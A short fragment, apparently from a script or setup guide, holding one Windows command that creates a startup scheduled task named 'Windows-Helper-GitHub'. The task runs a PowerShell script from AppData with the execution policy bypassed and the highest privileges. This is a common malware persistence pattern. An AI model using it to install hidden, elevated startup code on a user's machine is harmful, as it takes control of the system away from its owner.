...
schtasks /create /sc 'ONSTART' /tn 'Windows-Helper-GitHub' /tr "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -ExecutionPolicy UnRestricted -File $env:AppData\Windows-Helper-GitHub.ps1" /rl HIGHEST /f
